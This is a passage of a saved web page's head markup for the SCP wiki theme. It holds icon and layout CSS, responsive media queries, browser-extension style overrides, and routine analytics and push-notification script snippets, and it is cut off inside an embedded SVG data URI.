"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}


#content-wrap {
	position: relative;
	margin: 2em auto 0;
	max-width: 1040px;
	min-height: 1300px;
	height: auto !important;
	height: 1500px;
}

h1, #page-title {
	color: #901;
	padding: 0 0 .25em;
	margin: 0 0 .6em;
	font-weight: normal;
}

h1 {
	margin-top: .7em;
	padding: 0;
	font-weight: bold;
}

h2, h3, h4, h5, h6 {
	margin: .5em 0 .4em;
	padding: 0;
	letter-spacing: 1px;
}

#page-title {
	border-color: #bbb;
}

.meta-title {
	border-bottom: solid 1px #bbb;
	color: #901;
	font-weight: normal;
	margin: 0 0 .6em;
	padding: 0 0 .25em;
	font-size: 200%;
}

.meta-title p {
	margin: 0;
}

ul {
	list-style: square;
}

li, p {
	line-height: 141%;
}

a {
	color: #b01;
	text-decoration: none;
	background: transparent;
}

a:visited {
	color: #824;
}

a:hover {
	text-decoration: underline;
	background-color: transparent;
}

#side-bar a:visited {
	color: #b01;
}

a.newpage {
	color: #d61;
	text-decoration: none;
	background: transparent;
}

.form-control {
	width: 95%;
}


#header, #top-bar {
	width: 90%;
	max-width: 980px;
	margin: 0 auto;
}

.mobile-top-bar {
	display: none;
	position: absolute;
	left: 1em;
	bottom: 0;
	z-index: 0;
}

body {
	background-color: #fff;
	font-size: .8em;
	color: #333;
}

div#container-wrap {
	background: url("https://scp-wiki.wdfiles.com/local--files/component:theme/body_bg.png") top left repeat-x;
}

sup {
	vertical-align: top;
	position: relative;
	top: -.5em;
}


#header {
	height: 140px;
	position: relative;
	z-index: 10;
	padding-bottom: 22px; 
	background: url("https://scp-wiki.wdfiles.com/local--files/component:theme/logo.png") 10px 40px no-repeat;
}

#search-top-box {
	position: absolute;
	top: 79px;
	right: 9px;
	width: 250px;
	text-align: right;
}

#search-top-box-input {
	border: solid 1px #999;
	border-radius: 5px;
	color: #ccc;
	background-color: #300;
	box-shadow: inset 1px 1px 3px rgba(0, 0, 0, .5);
}

#search-top-box-input:hover,
#search-top-box-input:focus {
	border: solid 1px #fff;
	color: #fff;
	background-color: #633;
	box-shadow: inset 1px 1px 3px rgba(0, 0, 0, .8);
}

#search-top-box-form input[type=submit] {
	border: solid 1px #999;
	border-radius: 5px;
	padding: 2px 5px;
	font-size: 90%;
	font-weight: bold;
	color: #ccc;
	background-color: #633;
	background-image: linear-gradient(to bottom, #966, #633, #300);
	box-shadow: 0 1px 3px rgba(0, 0, 0, .5);
	cursor: pointer;
}

#search-top-box-form input[type=submit]:hover,
#search-top-box-form input[type=submit]:focus {
	border: solid 1px #fff;
	color: #fff;
	text-shadow: 0 0 1px rgba(255, 255, 255, .25);
	background-color: #966;
	background-image: linear-gradient(to bottom, #c99, #966, #633);
	box-shadow: 0 1px 3px rgba(0, 0, 0, .8);
}

#login-status {
	color: #aaa;
	font-size: 90%;
	z-index: 30;
}

#login-status a {
	background: transparent;
	color: #ddd;
}

#login-status ul a {
	color: #700;
	background: transparent;
}

#account-topbutton {
	background: #ccc;
	color: #700;
}

.printuser img.small {
	margin-right: 1px;
}

#header h1 {
	margin-left: 120px;
	padding: 0;
	float: left;
	max-height: 95px;
}

#header h2 {
	margin-left: 120px;
	padding: 0;
	clear: left;
	float: left;
	font-size: 105%;
	max-height: 38px;
}

#header h1 a {
	display: block;
	margin: 0;
	padding: 80px 0 25px;
	line-height: 0px;
	max-height: 0;
	color: #eee;
	background: transparent;
	font-family: BauhausLTDemi, 'Nanum Gothic', Arial, sans-serif;
	font-size: 180%;
	text-decoration: none;
	text-shadow: 3px 3px 5px #000;
	letter-spacing: .9px;
}

#header h2 span {
	display: block;
	margin: 0;
	padding: 19px 0;
	line-height: 0px;
	max-height: 0;
	font-weight: bold;
	color: #f0f0c0;
	text-shadow: 1px 1px 1px #000;
	text-shadow: 1px 1px 1px rgba(0, 0, 0, .8);
}


#top-bar {
	position: absolute;
	top: 140px;
	height: 21px;
	width: 100%;
	line-height: 18px;
	padding: 0;
	margin: 0 auto;
	z-index: 20;
	font-size: 90%;
}

#top-bar ul {
	float: right;
}

#top-bar li {
	margin: 0;
}

#top-bar a {
	color: #fff;
	background: transparent;
}

#top-bar ul li {
	border: 0;
	position: relative;
}

#top-bar ul li ul {
	border: solid 1px #666;
	box-shadow: 0 2px 6px rgba(0, 0, 0, .5);
	border-top: 0;
	border-width: 0 1px 1px 1px;
	width: auto;
}

#top-bar ul li a {
	border-left: solid 1px rgba(64, 64, 64, .1);
	border-right: solid 1px rgba(64, 64, 64, .1);
	text-decoration: none;
	padding-top: 10px;
	padding-bottom: 10px;
	line-height: 1px;
	max-height: 1px;
	overflow: hidden;
}

#top-bar ul li.sfhover a,
#top-bar ul li:hover a {
	background: #eee;
	color: #a01;
	border-left: solid 1px rgba(64, 64, 64, 1);
	border-right: solid 1px rgba(64, 64, 64, 1);
}

#top-bar ul li.sfhover ul li a,
#top-bar ul li:hover ul li a {
	border-width: 0;
	width: 150px;
	border-top: 1px solid #ddd;
	line-height: 160%;
	height: auto;
	max-height: none;
	padding-top: 0;
	padding-bottom: 0;
}

#top-bar ul li.sfhover a:hover,
#top-bar ul li:hover a:hover {
	background: #fff;
	text-decoration: none;
}

#top-bar ul li ul li,
#top-bar ul li ul li.sfhover,
#top-bar ul li ul li:hover {
	border-width: 0;
}

#top-bar ul li ul li a {
	border-width: 0;
}

#top-bar ul li ul a, #top-bar a:hover {
	color: #a01;
}

.top-bar ul li:last-of-type ul {
	right: 0;
}


#top-bar ul > li > ul {
	*margin-top: -4px;
}


#side-bar {
	clear: none;
	float: none;
	position: absolute;
	top: .5em;
	left: 2em;
	width: 17em;
	padding: 0;
	border: none;
	display: block;
	overscroll-behavior: none;
}

#side-bar .side-block {
	padding: 10px;
	border: 1px solid #600;
	border-radius: 10px;
	box-shadow: 0 2px 6px rgba(102, 0, 0, .5);
	background: #fff;
	margin-bottom: 15px;
}

#side-bar .side-block.media {
	background: #e5e5ff;
}

#side-bar .side-block.resources {
	background: #fff0f0;
}

#side-bar .side-area {
	padding: 10px;
}

#side-bar .heading {
	color: #600;
	border-bottom: solid 1px #600;
	padding-left: 15px;
	margin-top: 10px;
	margin-bottom: 5px;
	font-size: 8pt;
	font-weight: bold;
}

#side-bar p {
	margin: 0;
}

#side-bar div.menu-item {
	margin: 2px 0;
}

#side-bar div.menu-item img {
	width: 13px;
	height: 13px;
	border: 0;
	margin-right: 2px;
	position: relative;
	bottom: -2px;
}

#side-bar div.menu-item a {
	font-weight: bold;
}

#side-bar div.menu-item.inactive img {
	opacity: .25;
}

#side-bar div.menu-item.inactive a {
	color: #999;
}

#side-bar div.menu-item .sub-text {
	font-size: 80%;
	color: #666;
}

#side-bar .collapsible-block-folded {
	background: url("https://scp-wiki.wdfiles.com/local--files/nav:side/expand.png") 0 2px no-repeat;
}

#side-bar .collapsible-block-link {
	margin-left: 15px;
	font-weight: bold;
}

#side-bar .collapsible-block-unfolded-link {
	border-bottom: solid 1px #600;
}

#side-bar .collapsible-block-unfolded-link .collapsible-block-link {
	margin-top: 10px;
	margin-bottom: 5px;
	font-size: 8pt;
	color: #600;
}

#side-bar .collapsible-block-unfolded-link .collapsible-block-link:hover {
	color: #b01;
	text-decoration: none;
}

#side-bar ul {
	list-style-type: none;
	padding: 0 5px 0;
}


#main-content {
	margin: 0 2em 0 22em;
	padding: 1em;
	position: relative;
}


#main-content .page-tags a[href^='/system:page-tags/tag/_'] {
	display: none;
}

#breadcrumbs {
	margin: -1em 0 1em;
}

.pseudocrumbs {
	margin: -1em 0 1em;
}


.yui-navset .yui-content {
	background-color: #f5f5f5;
}

.yui-navset .yui-nav a,
.yui-navset .yui-navset-top .yui-nav a {
	background-color: #d8d8d8;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3b8418686296/common--theme/shiny/images/yuitabs.png");
}

.yui-navset .yui-nav .selected a,
.yui-navset .yui-nav .selected a:focus, 
.yui-navset .yui-nav .selected a:hover { 
	background: #700 url("https://d3g0gp89917ko0.cloudfront.net/v--3b8418686296/common--theme/shiny/images/yuitabs.png") repeat-x left -1400px; 
	color: #fff;
}

.yui-navset .yui-nav a:hover,
.yui-navset .yui-nav a:focus {
	background: #d88 url("https://d3g0gp89917ko0.cloudfront.net/v--3b8418686296/common--theme/shiny/images/yuitabs.png") repeat-x left -1300px;
	text-decoration: none;
}

.yui-navset .yui-nav,
.yui-navset .yui-navset-top .yui-nav {
	border-color: #444;
}

.yui-navset li {
	line-height: normal;
}


#footer {
	clear: both;
	font-size: 77%;
	background: #444;
	color: #bbb;
	margin-top: 15px;
	padding: 3px 10px;
}

#footer .options {
	visibility: visible;
	display: block;
	float: right;
	width: 50%;
	font-size: 100%;
	text-align: right;
}

#footer a {
	color: #fff;
	background: transparent;
}


div.sexy-box {
	background: #eee;
	border: 1px solid #ccc;
	padding: 0 10px 12px;
	margin: 7px 4px 12px;
	overflow: hidden;
}

div.sexy-box div.image-container img {
	margin: 5px;
	padding: 2px;
	border: 1px solid #999;
}


#page-content {
	min-height: 720px;
}

.unmargined > p {
	margin: 0;
	line-height: 100%;
}

.content-panel {
	border: solid 1px #888880;
	border-radius: 10px;
	background-color: #999990;
	margin: 10px 0 15px;
	box-shadow: 3px 3px 6px #bbb;
	box-shadow:
		0 2px 6px rgba(0, 0, 0, .5),
		inset 0 1px rgba(255, 255, 255, .3),
		inset 0 10px rgba(255, 255, 255, .2),
		inset 0 10px 20px rgba(255, 255, 255, .25),
		inset 0 -15px 30px rgba(0, 0, 0, .1);
}

.content-panel.standalone {
	background: #fcfdfb;
}

.content-panel.series {
	padding: 0 20px;
	margin-bottom: 20px;
}

.content-panel.centered {
	text-align: center;
}

.content-panel.left-column {
	float: left;
	width: 48%;
}

.content-panel.right-column {
	float: right;
	width: 48%;
}

.content-panel .panel-heading {
	padding: 2px 10px;
	color: #fff;
	font-size: 90%;
	font-weight: bold;
	text-shadow: 1px 1px 2px rgba(0, 0, 0, .35);
}

.content-panel .panel-heading > p,
.content-panel .panel-footer > p {
	margin: 0;
}

.content-panel .panel-body {
	padding: 5px 10px;
	background: #fff9f0 url("https://scp-wiki.wdfiles.com/local--files/component:theme/panel-bg-gradient-reverse.png") bottom repeat-x;
}

.content-panel .panel-footer {
	padding: 1px 10px;
	color: #fffff0;
	font-size: 80%;
	font-weight: bold;
	text-align: right;
	text-shadow: 1px 1px 2px rgba(0, 0, 0, .5);
}

.content-panel .panel-footer a {
	color: #fff;
}

.content-panel .content-toc {
	float: right;
	padding: 0 20px;
	background-color: #fff;
	border: solid 1px #ccc;
	border-radius: 10px;
	margin: 20px 0 5px 5px;
	white-space: nowrap;
	box-shadow: inset 1px 2px 6px rgba(0, 0, 0, .15);
}

.alternate:nth-child(even) {
	background-color: rgba(255, 255, 255, .9);
}


.page-rate-widget-box {
	display: inline-block;
	border-radius: 5px;
	box-shadow: 1px 1px 3px rgba(0, 0, 0, .5);
	margin-bottom: 10px;
	margin-right: 2em;
}

.page-rate-widget-box .rate-points {
	background-color: #633 !important;
	border: solid 1px #633;
	border-right: 0;
	border-radius: 5px 0 0 5px;
}

.page-rate-widget-box .rateup,
.page-rate-widget-box .ratedown {
	background-color: #fff6f0;
	border-top: solid 1px #633;
	border-bottom: solid 1px #633;
	font-weight: bold;
}

.page-rate-widget-box .rateup a,
.page-rate-widget-box .ratedown a {
	background: transparent;
	color: #633;
	padding: 0 4px;
	margin: 0 1px;
}

.page-rate-widget-box .rateup a:hover,
.page-rate-widget-box .ratedown a:hover {
	background: #633;
	color: #fffff0;
	text-decoration: none;
}

.page-rate-widget-box .cancel {
	background-color: #633;
	border: solid 1px #633;
	border-left: 0;
	border-radius: 0 5px 5px 0;
}

.page-rate-widget-box .cancel a {
	background: transparent;
	text-transform: uppercase;
	color: #966;
}

.page-rate-widget-box .cancel a:hover {
	border-radius: 0 3px 3px 0;
	background: #633;
	color: #fffff0;
	text-decoration: none;
}


#main-content .page-tags {
	margin: 1em 0 0;
	padding: 0;
}

#main-content .page-tags span {
	display: inline-block;
	padding: 0;
	max-width: 60%;
}

#main-content .page-tags a {
	display: inline-block;
	white-space: nowrap;
}


.scp-image-block {
	border: solid 1px #666;
	box-shadow: 0 1px 6px rgba(0, 0, 0, .25);
	width: 300px;
}

.scp-image-block.block-right {
	float: right;
	clear: right;
	margin: 0 2em 1em 2em;
}

.scp-image-block.block-left {
	float: left;
	clear: left;
	margin: 0 2em 1em 0;
}

.scp-image-block.block-center {
	margin-right: auto;
	margin-left: auto;
}

.scp-image-block img {
	border: 0;
	width: 300px;
}

.scp-image-block .scp-image-caption {
	background-color: #eee;
	border-top: solid 1px #666;
	padding: 2px 0;
	font-size: 80%;
	font-weight: bold;
	text-align: center;
	width: 300px;
}

.scp-image-block > p {
	margin: 0;
}

.scp-image-block .scp-image-caption > p {
	margin: 0;
	padding: 0 10px;
}


.footer-wikiwalk-nav {
	font-weight: bold;
	font-size: 75%;
}


.licensebox .collapsible-block-link {
	margin-left: .25em;
	padding: .25em;
	font-weight: bold;
	opacity: .5;
	color: inherit;
	-webkit-transition: opacity .5s ease-in-out;
	-moz-transition: opacity .5s ease-in-out;
	transition: opacity .5s ease-in-out;
}

.licensebox .collapsible-block-link:hover,
.licensebox .collapsible-block-link:active {
	opacity: 1;
}


.forum-thread-box .description-block {
	padding: .5em 1em;
	border-radius: 10px;
	box-shadow:
		0 1px 5px rgba(0, 0, 0, .15),
		inset 0 1px 0 rgba(255, 255, 255, .8),
		inset 0 10px 5px rgba(255, 255, 255, .25),
		inset 0 -15px 30px rgba(0, 0, 0, .1);
}

.thread-container .post .head {
	padding: .5em 1em;
	background-color: #eee;
	background-image: linear-gradient(to right, #eee, #eeecec);
	box-shadow: inset 2px 3px 6px rgba(0, 0, 0, .15);
	border-radius: 5px 5px 0 0;
}


.signature {
	display: none !important;
}


.ruby, ruby {
	display: inline-table;
	text-align: center;
	white-space: nowrap;
	line-height: 1;
	height: 1em;
	vertical-align: text-bottom;
}

.rt, rt {
	display: table-header-group;
	font-size: .6em;
	line-height: 1.1;
	text-align: center;
	white-space: nowrap;
}


.keycap {
	border: 1px solid;
	border-color: #ddd #bbb #bbb #ddd;
	border-bottom-width: 2px;
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	background-color: #f9f9f9;
	padding: 1px 3px;
	font-family: inherit;
	font-size: .85em;
	white-space: nowrap;
}


.tags {
	display: inline-block;
	margin: 0 0 0 5px;
	padding: 3px 5px 3px 0;
	height: 13px;
	line-height: 13px;
	font-size: 11px;
	background: #666;
	color: #fff;
	text-decoration: none;
	-moz-border-radius-bottomright: 4px;
	-webkit-border-bottom-right-radius: 4px;
	border-bottom-right-radius: 4px;
	-moz-border-radius-topright: 4px;
	-webkit-border-top-right-radius: 4px;
	border-top-right-radius: 4px;
}

.tags::before {
	content: '';
	padding: 0 1px 3px 1px;
	float: left;
	position: relative;
	top: -3px;
	left: -10px;
	width: 0;
	height: 0;
	border-color: transparent #666 transparent transparent;
	border-style: solid;
	border-width: 8px 8px 8px 0;
}

.tags::after {
	content: '';
	position: relative;
	top: 4.5px;
	left: -8px;
	float: left;
	width: 4px;
	height: 4px;
	-moz-border-radius: 2px;
	-webkit-border-radius: 2px;
	border-radius: 2px;
	background: #fff;
	-moz-box-shadow: -1px -1px 2px #004977;
	-webkit-box-shadow: -1px -1px 2px #333;
	box-shadow: -1px -1px 2px #333;
}


.bblock {
	color: #000;
	background-color: #000;
	transition: 2s;
	text-decoration: none;
}

.bblock:hover {
	background-color: #000;
	color: #060;
	text-decoration: none;
}

.dblock {
	color: #000;
	background-color: #000;
	transition: 2s;
	text-decoration: none;
}

.dblock:hover {
	background-color: transparent;
	text-decoration: none;
}


div.blockquote {
	border: 1px dashed #999;
	background-color: #f4f4f4;
	padding: 0 1em;
	margin: 1em 3em;
}

div.curved {
	border-radius: 10px;
	margin: 1em 3em;
}

@media (max-width: 479px) {
	div.blockquote,
	div.curved {
		margin: 1em 0;
	}
}

@media (min-width: 480px) and (max-width: 580px) {
	div.blockquote,
	div.curved {
		margin: .5em;
	}
}


.changes-list-item td.title {
	min-width: 40%;
}

.changes-list-item .flags {
	text-align: center;
	width: 2em;
}

.changes-list-item .mod-date {
	text-align: center;
}

.changes-list-item .mod-by {
	width: 10em;
}

@media (max-width: 435px) {
	.changes-list-item .revision-no {
		display: none;
	}
}



.emph {
	text-emphasis-style: dot;
	-webkit-text-emphasis-style: dot;
}


@-moz-document url-prefix() {
	.emph {
		
		font-family: monospace;
		font-style: normal;
		font-weight: normal;
		background-repeat: repeat-x;
		padding: .5em 0 0;
		background-color: transparent;
		background-clip: padding-box, content-box;
		background-size: 1em 1.3em, auto;
	}
}


@media screen and (-ms-high-contrast: active), (-ms-high-contrast: none) {
	.emph {
		
		font-family: monospace;
		font-style: normal;
		font-weight: normal;
		background-repeat: repeat-x;
		padding: .5em 0 0;
		background-color: transparent;
		background-clip: padding-box, content-box;
		background-size: 1em 1.3em, auto;
	}
}



@viewport {
	width: device-width;
	zoom: 1;
}


@-ms-viewport {
	width: device-width;
	zoom: 1;
}


@-o-viewport {
	width: device-width;
	zoom: 1;
}


@-webkit-viewport {
	width: device-width;
	zoom: 1;
}


@-moz-viewport {
	width: device-width;
	zoom: 1;
}


::-webkit-scrollbar {
	width: 9px; 
	height: 9px; 
	border: solid 1px rgba(0, 0, 0, .1);
}

::-webkit-scrollbar-track {
	background: rgba(0, 0, 0, .1);
}

::-webkit-scrollbar-thumb {
	background: rgba(50, 50, 50, .3);
}

.page-source {
	word-break: break-all;
}


img, embed, video, object, iframe, table {
	max-width: 100%;
}

#page-content div, #page-content div table {
	max-width: 100%;
}

#edit-page-comments {
	width: 100%;
}



@media (max-width: 767px) {
	.owindow {
		min-width: 80%;
		max-width: 99%;
	}

	.modal-body .table, .modal-body .table ~ div {
		float: left;
	}

	.owindow .button-bar {
		float: right;
	}

	.owindow div a.btn-primary {
		width: 100%;
		float: left;
	}

	.mobile-top-bar ul li:last-of-type ul {
		right: 0;
	}

	span, a {
		word-break: break-all;
	}
}


@media (max-width: 479px) {
	#search-top-box-input {
		display: none;
	}

	#page-content {
		font-size: .9em;
	}

	#main-content {
		margin: 0;
	}

	#recent-posts-category {
		width: 100%;
	}

	#header, .mobile-top-bar {
		max-width: 90%;
	}

	#side-bar {
		width: 80%;
		position: relative;
	}

	.top-bar {
		display: none;
	}

	.mobile-top-bar {
		display: block;
		padding: 0;
	}

	.page-options-bottom a {
		padding: 0 4px;
	}

	#header h1 a {
		font-size: 100%;
	}

	blockquote {
		margin: 1em 0;
	}

	.license-area {
		font-size: .8em;
	}

	#header {
		background-position: 0 5.5em;
		background-size: 55px 55px;
	}

	#header h1, #header h2 {
		margin-left: 66px;
	}

	table.form td, table.form th {
		float: left;
		padding: 0;
	}

	td.name {
		width: 15em;
	}

	#edit-page-title {
		max-width: 90%;
	}

	.content-panel.left-column, .content-panel.right-column {
		width: 99%;
		float: left;
	}

	#page-content div, #page-content div table {
		clear: both;
	}

	#page-content div.title {
		word-break: keep-all;
	}
}


@media (max-width: 385px) {
	#header {
		background-position: 5% 5.5em;
	}

	#header h1, #header h2 {
		margin-left: -webkit-calc(66px + 5%);
		margin-left: -moz-calc(66px + 5%);
		margin-left: calc(66px + 5%);
	}

	#header, #top-bar {
		width: 100%;
		max-width: 100%;
	}

	.mobile-top-bar {
		width: 100%;
	}

	#top-bar li a {
		padding: 10px .5em;
	}
}


@media (min-width: 480px) and (max-width: 580px) {
	#search-top-box-input {
		width: 7em;
	}

	#main-content {
		margin: 0 2em 0 2em;
	}

	#header, .mobile-top-bar {
		max-width: 90%;
	}

	#side-bar {
		width: 80%;
		position: relative;
	}

	.top-bar {
		display: none;
	}

	.mobile-top-bar {
		display: block;
	}

	.page-options-bottom a {
		padding: 0 5px;
	}

	#header h1 a {
		font-size: 120%;
	}

	blockquote {
		margin: .5em;
	}

	.license-area {
		font-size: .85em;
	}

	#header {
		background-position: .5em 4.5em;
		background-size: 66px 66px;
	}

	#header h1, #header h2 {
		margin-left: 80px;
	}

	#page-content div.title {
		word-break: keep-all;
	}

	td.name {
		width: 15em;
	}

	.content-panel.left-column, .content-panel.right-column {
		width: 99%;
		float: left;
	}

	#page-content div, #page-content div table {
		clear: both;
	}
}


@media (min-width: 581px) and (max-width: 767px) {
	#search-top-box-input {
		width: 8em;
	}

	#side-bar {
		width: 80%;
		position: relative;
	}

	#main-content {
		margin: 0 3em 0 2em;
	}

	#header, .mobile-top-bar {
		max-width: 90%;
	}

	.top-bar {
		display: none;
	}

	.mobile-top-bar {
		display: block;
	}

	.page-options-bottom a {
		padding: 0 6px;
	}

	#header h1 a {
		font-size: 140%;
	}

	.license-area {
		font-size: .9em;
	}

	#header {
		background-position: 1em 4em;
		background-size: 77px 77px;
	}

	#header h1, #header h2 {
		margin-left: 93px;
	}
}


@media (min-width: 768px) and (max-width: 979px) {
	#main-content {
		margin: 0 4em 0 20em;
	}

	#header, #top-bar #side-bar {
		max-width: 100%;
	}

	.top-bar li {
		margin: 0;
	}

	#top-bar ul li.sfhover ul li a,
	#top-bar ul li:hover ul li a {
		width: 110px;
	}

	.page-options-bottom a {
		padding: 0 7px;
	}

	#header h1 a {
		font-size: 160%;
	}

	.license-area {
		font-size: .95em;
	}

	#header {
		background-position: 1em 4em;
		background-size: 88px 88px;
	}

	#header h1, #header h2 {
		margin-left: 106px;
	}

	.content-panel.left-column, .content-panel.right-column {
		width: 99%;
		float: left;
	}

	#page-content div, #page-content div table {
		clear: both;
	}
}


.close-menu {
	display: none;
}

@media (max-width: 767px) {
	.page-history tbody tr td:last-child {
		width: 35%;
	}

	.owindow {
		min-width: 80%;
		max-width: 99%;
	}

	.modal-body .table, .modal-body .table ~ div {
		float: left;
	}

	.owindow .button-bar {
		float: right;
	}

	.owindow div .btn-primary {
		width: 100%;
		float: left;
	}

	.owindow div .btn-primary ~ div {
		width: 100%;
	}

	.yui-navset {
		z-index: 1;
	}

	#navi-bar, #navi-bar-shadow {
		display: none;
	}

	#top-bar .open-menu a {
		position: fixed;
		top: .5em;
		left: .5em;
		z-index: 15;
		font-family: 'Nanum Gothic', sans-serif;
		font-size: 30px;
		font-weight: 700;
		width: 30px;
		height: 30px;
		line-height: .9em;
		text-align: center;
		border: .2em solid #888;
		background-color: #fff;
		border-radius: 3em;
		color: #888;
	}

	#top-bar .open-menu a:hover {
		text-decoration: none;
		-webkit-box-shadow: 0 0 20px 3px rgba(153, 153, 153, 1);
		-moz-box-shadow: 0 0 20px 3px rgba(153, 153, 153, 1);
		-ms-box-shadow: 0 0 20px 3px rgba(153, 153, 153, 1);
		-o-box-shadow: 0 0 20px 3px rgba(153, 153, 153, 1);
		box-shadow: 0 0 20px 3px rgba(153, 153, 153, 1);
	}

	#main-content {
		max-width: 90%;
		margin: 0 5%;
		padding: 0;
		-webkit-transition: .5s ease-in-out .1s;
		-moz-transition: .5s ease-in-out .1s;
		-ms-transition: .5s ease-in-out .1s;
		-o-transition: .5s ease-in-out .1s;
		transition: .5s ease-in-out .1s;
	}

	#side-bar {
		display: block;
		position: fixed;
		top: 0;
		left: -25em;
		width: 17em;
		height: 100%;
		background-color: rgb(184, 134, 134);
		overflow-y: auto;
		z-index: 10;
		padding: 1em 1em 0 1em;
		-webkit-transition: left .5s ease-in-out .1s;
		-moz-transition: left .5s ease-in-out .1s;
		-ms-transition: left .5s ease-in-out .1s;
		-o-transition: left .5s ease-in-out .1s;
		transition: left .5s ease-in-out .1s;
	}

	#side-bar::after {
		content: '';
		position: absolute;
		top: 0;
		width: 0;
		height: 100%;
		background-color: rgba(0, 0, 0, .2);
	}

	#side-bar:target {
		display: block;
		left: 0;
		width: 17em;
		margin: 0;
		border: 1px solid #dedede;
		z-index: 10;
	}

	#side-bar:target + #main-content {
		left: 0;
	}

	#side-bar:target .close-menu {
		display: block;
		position: fixed;
		width: 100%;
		height: 100%;
		top: 0;
		left: 0;
		background: rgba(0, 0, 0, .3) 1px 1px repeat;
		z-index: -1;
	}
}

div.scpnet-interwiki-wrapper {
	width: 17em;
	margin-left: -5px;
}

iframe.scpnet-interwiki-frame {
	height: 350px;
	width: 17em;
	border: none;
}

@media (min-width: 768px) {
	iframe.scpnet-interwiki-frame, div.scpnet-interwiki-wrapper {
		width: 18em;
	}
}


div#u-adult-warning {
	width: fit-content;
	margin: 0 auto 20px;
	padding: .5rem 1rem;
	border: 3px solid #333;
	background: #e4e4e4;
	color: #333;
	text-align: center;
	font-weight: bold;
}

div#u-adult-warning > div#u-adult-header {
	font-size: 300%;
	text-shadow: 1px 2px 3px rgba(0, 0, 0, .5);
	color: #901;
}

div#u-adult-warning > div#u-adult-header p {
	margin: 0;
}

div#u-adult-warning > .error-block {
	color: unset;
	padding: unset;
	margin: unset;
	border: unset;
	margin-bottom: 1em;
}


div.preview {
	display: none;
}</style><style class="darkreader darkreader--sync" media="screen"></style>
    
        
        
        
    <link rel="shortcut icon" href="/local--favicon/favicon.gif">
    <link rel="icon" type="image/gif" href="/local--favicon/favicon.gif">
    
            <link rel="apple-touch-icon" href="/local--iosicon/iosicon_57.png">
        <link rel="apple-touch-icon" sizes="72x72" href="/local--iosicon/iosicon_72.png">
        <link rel="apple-touch-icon" sizes="114x114" href="/local--iosicon/iosicon.png">    
        
        
            <link rel="alternate" type="application/wiki" title="Edit this page" href="javascript:WIKIDOT.page.listeners.editClick()">
    
        <script type="text/javascript">
        var _gaq = _gaq || [];
        _gaq.push(['_setAccount', 'UA-18234656-1']);
        _gaq.push(['_setDomainName', 'none']);
        _gaq.push(['_setAllowLinker', true]);
        _gaq.push(['_trackPageview']);

        _gaq.push(['old._setAccount', 'UA-68540-5']);
        _gaq.push(['old._setDomainName', 'none']);
        _gaq.push(['old._setAllowLinker', true]);
        _gaq.push(['old._trackPageview']);

                _gaq.push(['userTracker._setAccount', 'UA-27317769-1']);
        _gaq.push(['userTracker._trackPageview']);
            </script><meta name="darkreader" content="246c79e5ab93949c9ba004e908694ffd"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: #7b5300 !important;
    border-color: #d8b013 !important;
    color: #f3e8c8 !important;
}
::placeholder {
    opacity: 0.5 !important;
}
a[href="https://coinmarketcap.com/"] > svg[width="94"][height="16"] > path {
    fill: var(--darkreader-neutral-text) !important;
}
#edge-translate-panel-body {
    color: var(--darkreader-neutral-text) !important;
}
div#container-wrap, .panel-body, .content-panel {
    background-image: none !important;
}
div#container-wrap::before {
    content: "";
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 162px;
    background-image: url(http://www.scp-wiki.net/local--files/component:theme/body_bg.png) !important;
}
.yui-navset .yui-nav a {
    background-image: none !important;
}</style>
    
    <script type="text/javascript">
        window.google_analytics_uacct = 'UA-18234656-1';
        window.google_analytics_domain_name = 'none';
    </script>
    
        <link rel="manifest" href="/onesignal/manifest.json">
    <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" acync=""></script>
    <script>
        var OneSignal = window.OneSignal || [];
        OneSignal.push(function() {
          OneSignal.init({
            appId: null,
          });
        });
    </script>
        
<style>
.cdver2 {
    background-image: url("data:image/svg+xml;charset=utf8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20version%3D%221.0%22%20width%3D%22600%22%20height%3D%22100%22%20viewBox%3D%220%200%20600%20100%22%20preserveAspectRatio%3D%22xMidYMid%20meet%22%3E%20%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%2250%25%22%20y%3D%2230%22%20text-anchor%3D%22middle%22%20font-size%3D%2221%22%20font-family%3D%22'Trebuchet%20MS'%2C%20Trebuchet%2C%20Verdana%2C%20Arial%2C%20Helvetica%22%20fill%3D%22%23901%22%20font-weight%3D%22bold%22%3EOh%20no!%3C%2Ftext%3E%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%2250%25%22%20y%3D%2245%22%20text-anchor%3D%22middle%22%20font-size%3D%2211%22%20font-family%3D%22'Trebuchet%20MS'%2C%20Trebuchet%2C%20Verdana%2C%20Arial%2C%20Helvetica%22%20fill%3D%22%23444%22%20font-weight%3D%22normal%22%3EPlease%20use%20an%20encoder%3B%20maybe%20the%20module%20is%20inserted%20characters%20without%20alphabets%2C%20numbers%20or%20a%20few%20symbols.%3C%2Ftext%3E%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%2250%25%22%20y%3